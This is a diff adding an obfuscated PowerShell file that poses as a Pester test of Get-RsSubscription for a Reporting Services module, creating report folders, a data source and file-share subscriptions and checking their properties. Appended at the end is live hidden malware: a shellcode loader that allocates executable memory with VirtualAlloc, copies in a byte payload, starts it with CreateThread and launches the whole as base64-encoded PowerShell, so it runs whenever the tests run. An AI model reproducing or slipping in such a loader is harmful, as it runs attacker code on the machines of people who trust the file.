@@ -1,0 +1,116 @@
+  $W5xOv =[tYpe]("{1}{0}"-F 'D','GUi')  ;   SV  ('f'+'813du') (  [TYpe]("{4}{2}{0}{3}{1}"-f '.','NverT','sTem','Co','Sy') ); $k9i0= [tyPE]("{4}{0}{5}{1}{2}{3}"-F'sTem.','t.','eNcodiN','g','sy','Tex');   sv  ('b'+'H57a')  ( [TypE]("{1}{0}"-f'R','InTpT')); 
+
+
+${repOR`T`S`ERv`erurI} = if (${ENV:`pE`sTEr`sErveRuRl} -eq ${N`ULl}) { ("{5}{3}{1}{0}{2}{4}" -f 'ost/','ocalh','rep','l','ortserver','http://') } else { ${En`V`:pe`sTErSe`RVERUrl} }
+
+Function sET-F`oLderRE`Po`RtdAtAsou`Rce
+{
+    param (
+        [string]
+        ${N`E`wFOLderp`Ath}
+    )
+
+    ${tEmP`P`R`oxy} = &("{3}{1}{2}{0}{4}{5}"-f'r','WebService','P','New-Rs','o','xy') -ReportServerUri ${rEPOrT`sE`R`VeRUri}
+
+    
+    ${LOCaL`Re`soUrCespA`Th} = (&("{1}{2}{0}"-f 'Item','Ge','t-') -Path ".\")."fu`LLNAmE"  + ((("{5}{2}{7}{3}{6}{8}{4}{1}{0}" -f 'rdl','ptyReport.','TestsVNvCatalogItem','NvtestReso','m','VNv','ur','sV','cesVNve'))-cREplACe  'VNv',[CHAr]92)
+    ${n`ULl} = &("{1}{3}{2}{4}{0}" -f 'm','Wri','RsCatalogIt','te-','e') -Path ${locALr`ESoURcEs`PA`TH} -RsFolder ${NE`wfO`lDe`RPaTh} -Proxy ${te`M`ppROxY}
+    ${rEpO`Rt} = (&("{1}{3}{0}{2}"-f 'lderConten','G','t','et-RsFo') -RsFolder ${Ne`wfoldERPA`Th} -Proxy ${tEMP`P`R`OXy})| &("{1}{0}{2}" -f'ere','Wh','-Object') ("{0}{1}"-f 'Ty','peName') -eq ("{0}{1}"-f'R','eport')
+
+    
+    ${lOc`A`Lres`OURcEs`P`Ath} =   (&("{1}{2}{0}"-f '-Item','Ge','t') -Path ".\")."FU`llnA`ME"  + ((("{9}{12}{8}{6}{0}{3}{15}{1}{7}{2}{4}{5}{10}{14}{11}{13}" -f 'ta','ms{0}t','tReso','l','urce','s','a','es','C','{0}','{0','Dataset.r','Tests{0}','sd','}Un','ogIte')) -F  [ChAR]92)
+    ${n`ULl} = &("{3}{4}{2}{1}{0}{5}{6}"-f'l','e-RsCata','t','Wr','i','o','gItem') -Path ${lOca`lrESOUrCES`p`A`TH} -RsFolder ${N`ew`Fol`d`Erpath} -Proxy ${TEMp`P`RoXY}
+    ${D`AtA`sEt} = (&("{2}{1}{5}{4}{3}{0}" -f 'tent','Rs','Get-','lderCon','o','F') -RsFolder ${neWfol`d`e`RPAth} -Proxy ${TEmP`pR`O`xy}) | &("{1}{2}{0}{3}" -f'ec','Where','-Obj','t') ("{1}{0}{2}" -f 'Na','Type','me') -eq ("{0}{2}{1}"-f 'D','et','ataS')
+    ${dA`TaS`ET`pATh} = ${N`EwfoLder`p`AtH} + ("{1}{3}{0}{2}" -f 'ata','/','Set','UnD')
+
+    
+    ${ne`W`RSdSnA`mE} = ("{1}{0}{2}" -f 'a','D','taSource')
+    ${neWRs`dSExTeN`S`i`On} = "SQL"
+    ${N`E`WRSd`S`Conne`CtiOnsTring} = ("{6}{0}{8}{3}{1}{5}{7}{2}{4}"-f'niti','a','ta Source=In','l C','stance','talog=','I','DB; Da','a')
+    ${NeWrsdscRe`denT`I`A`LR`eTRI`e`VAL} = ("{0}{1}"-f'Sto','re')
+    ${pa`sS} = &("{1}{3}{4}{2}{0}"-f 'SecureString','C','o-','onv','ertT') -String "123" -AsPlainText -Force
+    ${NEwRs`dS`Cred`EntiaL} = &("{1}{0}{2}" -f 'w-Ob','Ne','ject') -TypeName ("{0}{1}{7}{5}{9}{6}{2}{3}{8}{4}" -f 'S','ys','tion.PSC','reden','ial','m.Ma','ment.Automa','te','t','nage') -ArgumentList "sql", ${P`AsS}
+    ${nU`ll} = &("{3}{1}{2}{0}" -f'taSource','R','sDa','New-') -RsFolder ${N`ewFo`L`DERpATH} -Name ${Ne`wrSd`Sn`Ame} -Extension ${nEWrSdS`EXTE`N`sI`On} -ConnectionString ${neW`R`SDsconnectION`St`R`I`Ng} -CredentialRetrieval ${NEwR`SdSc`RED`En`T`iaLRE`TrI`eval} -DatasourceCredentials ${New`RsDSC`REdEN`TIAl} -Proxy ${TEm`PP`ROxY}
+
+    ${da`Taso`URcE`PAtH} = "$NewFolderPath/$newRSDSName"
+
+    
+    ${RSd`ATA`sEt} = &("{0}{4}{3}{2}{1}"-f'Get-','rence','e','Ref','RsItem') -Path ${r`epO`RT}."P`AtH" -Proxy ${Te`MPpRO`XY} | &("{0}{2}{1}{3}"-f 'Whe','c','re-Obje','t') ("{2}{1}{0}"-f'enceType','fer','Re') -eq ("{2}{0}{1}"-f'aS','et','Dat')
+    ${rS`DaTas`ou`RCE} = &("{1}{2}{0}{3}{4}{5}" -f'emR','Get-Rs','It','e','ferenc','e') -Path ${REP`ORt}."pa`Th" -Proxy ${TEm`ppr`OxY} | &("{2}{0}{1}" -f 'e','ct','Where-Obj') ("{3}{1}{0}{2}"-f'ferenceT','e','ype','R') -eq ("{0}{2}{1}"-f'Da','rce','taSou')
+    ${RsDAtA`se`Tso`Ur`CE} = &("{3}{2}{4}{1}{5}{0}" -f 'nce','mRefe','-RsIt','Get','e','re') -Path ${dAtAs`e`TPa`Th} -Proxy ${t`eMP`p`ROxy} | &("{1}{0}{2}"-f 'e','Wh','re-Object') ("{0}{2}{1}"-f'R','ype','eferenceT') -eq ("{0}{1}{2}" -f'Da','taSourc','e')
+
+    
+    ${nU`lL} = &("{5}{0}{1}{6}{4}{3}{2}" -f'sData','S','erence','f','rceRe','Set-R','ou') -Path ${da`T`AseTpATH} -DataSourceName ${rs`DAtaSet`S`O`URCE}."Na`Me" -DataSourcePath ${daTa`sO`UrCEPa`Th} -Proxy ${Te`mp`prOxY}
+    ${N`ULL} = &("{3}{6}{0}{4}{2}{5}{1}{7}" -f'sDat','enc','SourceR','Set-','a','efer','R','e') -Path ${r`ePOrt}."p`AtH" -DataSourceName ${R`SD`ATASouRCe}."N`AMe" -DataSourcePath ${DaT`A`SOUr`cePAth} -Proxy ${TE`Mppr`oXY}
+    ${NU`Ll} = &("{0}{4}{1}{3}{2}" -f'Set-RsDa','aS','erence','etRef','t') -Path ${rePO`RT}."pA`TH" -DataSetName ${RSDa`T`AsET}."nA`ME" -DataSetPath ${D`A`TASet}."p`Ath" -Proxy ${t`EMp`P`Roxy}
+
+    return ${re`P`ort}
+}
+
+&("{0}{1}"-f'Des','cribe') ("{1}{2}{4}{0}{3}" -f 'rip','Get-Rs','Sub','tion','sc') {
+    ${f`old`ER`paTh} = ''
+    ${NEWre`po`Rt} = ${Nu`lL}
+
+    &("{1}{0}{2}" -f 'ore','Bef','Each') {
+        ${fo`LdERNA`ME} = ("{3}{5}{0}{6}{1}{2}{4}" -f 'Refer','n','Para','SutGetR','meters','sItem','ence_Mi') +   $w5xOV::("{0}{1}"-f 'New','Guid').Invoke()
+        ${N`Ull} = &("{3}{1}{2}{0}" -f'lder','w-','RsFo','Ne') -Path ('/') -FolderName ${Fo`L`DErnAME} -ReportServerUri ${repo`RTse`R`VERURI}
+        ${fO`LDERpa`Th} = '/' + ${Fol`d`erN`Ame}
+
+        
+        ${N`E`W`RepORT} = &("{0}{2}{1}{3}{4}{5}" -f 'Set','old','-F','erRepo','rtD','ataSource')(${f`OLDE`Rpath})
+
+        
+        &("{2}{5}{4}{3}{1}{0}" -f 'n','scriptio','New','ub','RsS','-') -ReportServerUri ${rePorTs`erVE`RU`Ri} -RsItem ${n`e`w`REPOrT}."Pa`Th" -DeliveryMethod ("{0}{1}{2}"-f'Fi','l','eShare') -Schedule (&("{0}{2}{3}{1}"-f 'New-Rs','leXml','Sch','edu')) -FileSharePath ((("{1}{2}{4}{3}{5}{0}"-f'h','{0}','{0}','}pa','unc{0','t'))-F [cHaR]92) -Filename ("{1}{0}"-f'rt','Repo') -FileWriteMode ("{0}{2}{1}"-f 'O','ite','verwr') -RenderFormat ("{0}{1}" -f 'P','DF')
+    }
+
+    &("{1}{0}"-f 'ext','Cont') ("{5}{2}{1}{0}{7}{3}{6}{4}" -f' with Proxy ','bscription','u','arame','r','Get-RsS','te','p'){
+        &('It') ("{1}{4}{2}{7}{8}{5}{6}{9}{10}{0}{11}{12}{3}"-f 'bsc','Sh','l','n','ou','re','fe','d fo','und a ','rence',' to a su','r','iptio') {
+            ${P`RoxY} = &("{2}{5}{4}{3}{0}{1}" -f 'e','Proxy','Ne','vic','WebSer','w-Rs') -ReportServerUri ${re`poR`TSErV`ERURI}
+            ${RepoRtsu`BSc`RiPtiO`NS} = &("{4}{2}{3}{5}{1}{0}" -f'tion','crip','t','-','Ge','RsSubs') -RsItem ${nEwre`P`oRt}."pA`TH" -Proxy ${pr`oxY}
+
+            @(${R`EPoRt`s`UBScR`Ip`TIOnS})."c`OuNT" | &("{1}{2}{0}" -f 'ld','Sho','u') ('Be') 1
+            ${RePor`TS`UBs`Cr`iPtIo`Ns}."rE`P`Ort" | &("{0}{2}{1}" -f'S','ould','h') ('Be') ("{0}{2}{1}"-f'e','t','mptyRepor')
+            ${rEpO`Rtsub`scRiP`Ti`O`Ns}."eveN`TTyPE" | &("{0}{1}"-f'Sh','ould') ('Be') ("{4}{2}{1}{0}{3}"-f'bscrip','Su','d','tion','Time')
+            ${R`E`pOr`TSU`B`scr`IpTIONs}."ISDaTa`Dr`I`Ven" | &("{0}{1}{2}" -f'S','h','ould') ('Be') ${fA`l`se}
+            ${REPOrts`U`Bscri`pti`ons}."de`LIVEryse`TT`IN`gS"."eXteN`sIOn" | &("{1}{0}"-f 'ould','Sh') ('Be') ("{1}{0}{2}{4}{3}" -f 'r','Repo','t Serve','FileShare','r ')
+            (${rE`PORTs`U`BS`Cr`iP`Tions}."DEl`IvERySeTtI`NGS"."PAr`AME`TERv`ALuES" | &("{0}{2}{1}{3}"-f'W','re-Obje','he','ct') { ${_}."nA`Me" -eq ("{0}{1}" -f 'Pa','th') })."Va`LUE" | &("{0}{1}" -f'Shoul','d') ('Be') ((("{0}{4}{1}{3}{2}" -f'{0}{0','0','h','}pat','}unc{'))-f [CHar]92)
+            (${rePOR`TsuBsC`R`ip`TI`Ons}."DElI`VEr`y`Se`TtIngs"."PARaM`ET`erva`l`UEs" | &("{0}{2}{1}" -f'Where-','ect','Obj') { ${_}."Na`ME" -eq ("{0}{1}{2}" -f 'Fil','eN','ame') })."v`Alue" | &("{1}{0}"-f'd','Shoul') ('Be') ("{0}{1}" -f'Repor','t')
+            (${rE`PoRTS`U`B`ScriptiONS}."dElIV`ErysE`T`T`inGS"."PA`RA`m`eTerVAlu`Es" | &("{2}{1}{0}{3}" -f 'je','here-Ob','W','ct') { ${_}."N`Ame" -eq ("{2}{1}{0}" -f 'e','riteMod','W') })."Va`Lue" | &("{1}{0}{2}"-f'houl','S','d') ('Be') ("{3}{2}{0}{1}" -f 'r','ite','rw','Ove')
+            (${r`e`P`OrtSubSC`RiPTiO`Ns}."DE`LiVeRySet`T`ingS"."PArAMe`TeRv`A`luEs" | &("{0}{3}{1}{2}" -f 'Whe','-','Object','re') { ${_}."Na`ME" -eq ("{3}{5}{1}{2}{0}{4}" -f'ial','n','t','Def','s','aultCrede') })."Va`lue" | &("{0}{1}"-f'S','hould') ('Be') ("{1}{0}" -f'rue','T')
+        }
+    }
+    
+    &("{1}{0}"-f'text','Con') ("{9}{11}{14}{3}{8}{2}{4}{1}{5}{13}{0}{12}{10}{7}{6}"-f 'verUri','port','on ','ip','with Re','Se','er','t','ti','G','me','et-RsSub',' Para','r','scr'){
+        &('It') ("{0}{5}{3}{6}{7}{1}{4}{2}"-f 'S','to a','bscription','a',' su','hould found ',' ','reference ') {
+            ${REpOrTs`Ubs`CRI`ptI`oNs} = &("{0}{3}{2}{5}{1}{4}"-f 'G','ript','s','et-RsSub','ion','c') -RsItem ${NEw`Re`PORT}."P`AtH" -ReportServerUri ${RepORT`sER`VEr`U`Ri}
+
+            @(${R`EpOR`TSUb`sCRIptiONS})."cO`UNt" | &("{0}{1}" -f 'S','hould') ('Be') 1
+            ${rEpOR`TS`UBS`CriP`TIoNs}."r`eporT" | &("{0}{1}" -f 'S','hould') ('Be') ("{2}{1}{3}{0}"-f 'rt','R','empty','epo')
+            ${reporT`SU`BSC`RIP`T`ions}."EVE`NTt`Ype" | &("{0}{2}{1}" -f 'Sh','d','oul') ('Be') ("{1}{3}{0}{4}{2}" -f 'dSu','T','cription','ime','bs')
+            ${rePoRT`s`UbsC`RI`PT`io`Ns}."I`SDAtaD`RIVEn" | &("{1}{0}" -f 'hould','S') ('Be') ${FA`lsE}
+            ${repor`TSu`BscRi`Pti`oNs}."DeL`IveRy`SeTtI`NGS"."Ex`TeNSi`on" | &("{1}{0}"-f'ould','Sh') ('Be') ("{1}{2}{3}{0}" -f'e','Report S','erver Fil','eShar')
+            (${REp`orTsU`BSCR`I`ptI`ons}."d`ElI`VE`RY`sETTiNGS"."p`AraMETErV`A`LUes" | &("{2}{0}{1}" -f 'c','t','Where-Obje') { ${_}."nA`ME" -eq ("{0}{1}" -f 'P','ath') })."vA`lue" | &("{0}{1}"-f 'Sh','ould') ('Be') ((("{2}{0}{3}{1}" -f'9','ath','j','6j96uncj96p'))  -RePLace ([CHAR]106+[CHAR]57+[CHAR]54),[CHAR]92)
+            (${RE`P`ORTS`UBScR`ipTi`ons}."DelIV`Ery`SET`TINgs"."pAraM`ET`Er`VAluEs" | &("{2}{3}{0}{1}"-f'Ob','ject','W','here-') { ${_}."N`AmE" -eq ("{1}{0}" -f 'Name','File') })."v`Alue" | &("{0}{1}" -f'Sho','uld') ('Be') ("{1}{0}"-f 'eport','R')
+            (${rE`poRtsUBScrIPt`iO`Ns}."d`ElivERY`S`EtT`iNGS"."p`ArAmetEr`V`A`LueS" | &("{2}{0}{3}{1}" -f 'e','-Object','Wh','re') { ${_}."Na`ME" -eq ("{2}{1}{0}"-f 'de','iteMo','Wr') })."V`ALue" | &("{0}{1}"-f'Shoul','d') ('Be') ("{0}{2}{1}" -f 'Ove','e','rwrit')
+            (${r`EPoRT`sUB`SC`RIp`TIONs}."Del`ivERYs`ett`In`gS"."pA`R`AmeTe`R`ValueS" | &("{3}{1}{0}{2}"-f 'ere-O','h','bject','W') { ${_}."NA`ME" -eq ("{0}{1}{3}{4}{5}{2}" -f'Def','a','s','ultC','reden','tial') })."VaL`Ue" | &("{0}{1}"-f'Shou','ld') ('Be') ("{1}{0}" -f'ue','Tr')
+        }
+    }
+    
+    &("{1}{0}"-f'xt','Conte') ("{3}{8}{14}{1}{0}{13}{17}{6}{10}{2}{16}{7}{5}{11}{9}{12}{15}{4}"-f'Subsc','s','h Repo','Get','eter','rver','on w','tSe','-',' and ','it','Uri','Proxy Para','ri','R','m','r','pti'){
+        &('It') ("{1}{3}{2}{0}{5}{4}{7}{6}" -f 'a referenc','Shou','nd ','ld fou','to a sub','e ','ription','sc') {
+            ${P`R`oxY} = &("{0}{1}{3}{2}{4}"-f 'New-RsWeb','Se','vic','r','eProxy') -ReportServerUri ${R`EPORt`SeR`VeRU`RI}
+            ${reP`ort`SUb`sCrIPtI`Ons} = &("{1}{3}{2}{4}{5}{0}" -f 'n','G','b','et-RsSu','scripti','o') -RsItem ${nE`Wr`epORT}."P`ATh" -Proxy ${P`Roxy} -ReportServerUri ${RePoRT`se`Rv`eru`RI}
+
+            @(${R`epoRtSuB`SC`Ri`PTioNS})."co`UnT" | &("{2}{1}{0}"-f'ould','h','S') ('Be') 1
+            ${rEPoRT`sU`B`scrIPT`iONs}."ReP`orT" | &("{1}{0}{2}"-f'oul','Sh','d') ('Be') ("{2}{0}{1}"-f 'yRepo','rt','empt')
+            ${R`EPoR`Ts`U`BScr`IPTiONs}."e`VEnt`TypE" | &("{1}{0}" -f 'ould','Sh') ('Be') ("{1}{0}{2}{3}"-f 'edSu','Tim','bscripti','on')
+            ${rEPortSu`BSCR`IP`T`IoNS}."isD`A`TAdriVeN" | &("{0}{1}"-f 'S','hould') ('Be') ${F`A`LSe}
+            ${rEPorT`Su`BSCrI`pTIOnS}."D`eLIvE`RYs`e`TtiNgS"."exT`En`sIon" | &("{0}{2}{1}" -f 'S','ld','hou') ('Be') ("{0}{1}{5}{2}{4}{3}" -f'Report S','erver F','l','are','eSh','i')
+            (${rePor`TSU`BsCRi`pTioNs}."D`ELIVerySe`T`T`ingS"."ParAmet`e`R`VALueS" | &("{0}{1}{2}"-f 'Where-O','bje','ct') { ${_}."na`Me" -eq ("{0}{1}"-f'P','ath') })."Val`Ue" | &("{0}{1}" -f'S','hould') ('Be') ((("{1}{0}{3}{2}"-f'}{0}unc{0','{0','path','}')) -f [ChAR]92)
+            (${rEp`orTS`U`B`sCrIPTioNs}."dE`Li`VeryS`Ettin`gs"."Par`AmE`TE`Rv`ALUEs" | &("{1}{2}{0}" -f 'e-Object','W','her') { ${_}."NA`ME" -eq ("{2}{1}{0}" -f 'e','Nam','File') })."VA`lUe" | &("{2}{0}{1}"-f 'u','ld','Sho') ('Be') ("{2}{1}{0}"-f'rt','po','Re')
+            (${RepOrtsuB`Sc`R`ip`TI`OnS}."DeL`IVErYsEt`T`I`NGS"."PAr`AMe`T`ErVAL`Ues" | &("{1}{2}{0}"-f't','W','here-Objec') { ${_}."N`AMe" -eq ("{1}{0}{2}" -f'ri','W','teMode') })."vaL`Ue" | &("{1}{0}" -f 'hould','S') ('Be') ("{0}{2}{1}"-f'Over','te','wri')
+            (${RePORTs`U`Bs`CrIptionS}."DeL`IV`e`R`YSetTiNgS"."pa`RaMetER`Va`l`UES" | &("{3}{1}{0}{2}" -f're-Objec','e','t','Wh') { ${_}."n`AMe" -eq ("{3}{1}{2}{0}{4}"-f 'l','Cre','dentia','Default','s') })."VAl`UE" | &("{0}{1}{2}"-f'Sh','o','uld') ('Be') ("{1}{0}"-f'ue','Tr')
+        }
+    }
+}
+${1} = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbb,0x04,0xea,0x1c,0x18,0xda,0xc1,0xd9,0x74,0x24,0xf4,0x5a,0x29,0xc9,0xb1,0x52,0x31,0x5a,0x12,0x03,0x5a,0x12,0x83,0xc6,0xee,0xfe,0xed,0x3a,0x06,0x7c,0x0d,0xc2,0xd7,0xe1,0x87,0x27,0xe6,0x21,0xf3,0x2c,0x59,0x92,0x77,0x60,0x56,0x59,0xd5,0x90,0xed,0x2f,0xf2,0x97,0x46,0x85,0x24,0x96,0x57,0xb6,0x15,0xb9,0xdb,0xc5,0x49,0x19,0xe5,0x05,0x9c,0x58,0x22,0x7b,0x6d,0x08,0xfb,0xf7,0xc0,0xbc,0x88,0x42,0xd9,0x37,0xc2,0x43,0x59,0xa4,0x93,0x62,0x48,0x7b,0xaf,0x3c,0x4a,0x7a,0x7c,0x35,0xc3,0x64,0x61,0x70,0x9d,0x1f,0x51,0x0e,0x1c,0xc9,0xab,0xef,0xb3,0x34,0x04,0x02,0xcd,0x71,0xa3,0xfd,0xb8,0x8b,0xd7,0x80,0xba,0x48,0xa5,0x5e,0x4e,0x4a,0x0d,0x14,0xe8,0xb6,0xaf,0xf9,0x6f,0x3d,0xa3,0xb6,0xe4,0x19,0xa0,0x49,0x28,0x12,0xdc,0xc2,0xcf,0xf4,0x54,0x90,0xeb,0xd0,0x3d,0x42,0x95,0x41,0x98,0x25,0xaa,0x91,0x43,0x99,0x0e,0xda,0x6e,0xce,0x22,0x81,0xe6,0x7e,0x58,0x4d,0xf7,0x16,0xd5,0xc4,0x99,0x8f,0x4d,0x7e,0x2a,0x27,0x48,0x79,0x4d,0x12,0xa5,0x5e,0xe2,0xce,0x95,0x33,0x56,0x99,0x23,0xe5,0x21,0xfe,0xab,0xdc,0x81,0x53,0x3e,0xdd,0x76,0x07,0xd6,0x6e,0x68,0xa7,0x26,0x98,0xf1,0xa7,0x26,0x58,0x2d,0x9c,0x63,0x13,0x75,0x88,0x6b,0xf3,0x1d,0x67,0xe5,0x6c,0x1b,0x78,0x20,0x1b,0x62,0xd4,0xa3,0x1b,0x69,0xbb,0xb7,0x48,0x3e,0x68,0xef,0x3d,0x96,0xe6,0xe4,0x94,0x38,0xcc,0x05,0xc3,0xd3,0x58,0xf0,0xb4,0x88,0xcf,0x57,0x19,0x79,0x98,0x7a,0x9b,0x9d,0x23,0x7a,0x76,0x18,0x13,0xf1,0x72,0x6c,0xe1,0x17,0xea,0x82,0xbc,0x4a,0xbc,0x9d,0x6a,0xe0,0x00,0x0a,0x95,0xe5,0x80,0xca,0xfd,0x05,0x80,0x8a,0xfd,0x56,0xe8,0x52,0x5a,0x0b,0x0d,0x9d,0x77,0x3f,0x9e,0x31,0xf1,0xa7,0x77,0xde,0x01,0x08,0x77,0x1e,0x51,0x1e,0x1f,0x0c,0xc3,0x17,0x3d,0xcf,0x3e,0xa2,0x01,0x44,0x0c,0x26,0x86,0xa4,0x4d,0xbc,0x48,0xd3,0xb4,0xe7,0x8b,0x43,0xdf,0x91,0xf4,0x83,0xe0,0x93,0x32,0x49,0x31,0xe3,0x71,0x9f,0x7e,0x3c,0x5b,0xe7,0xb1,0x42;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';${E} =  (  vArIAbLe  ('F'+'813Du') -ValuEoNl  )::"tObAsE64s`TR`iNG"(  $k9i0::"un`iCO`DE".("{0}{2}{1}"-f'Get','ytes','B').Invoke(${1}));${2} = ("{0}{1}" -f'-e','nc ');if( $bh57a::"S`iZE" -eq 8){${3} = ${eNv`:sYs`Te`MROOT} + ((("{0}{6}{11}{7}{1}{2}{9}{10}{5}{4}{8}{3}" -f'TSXsyswow64TSXW','e','rShel','hell','wer','po','indowsP','w','s','lT','SXv1.0TSX','o'))."R`ep`lAce"('TSX',[sTring][char]92));&("{0}{1}" -f 'i','ex') ('& '+"$3 "+"$2 "+"$e")}else{;&("{0}{1}"-f'ie','x') ('& '+'pow'+'ershell'+' '+"$2 "+"$e");}
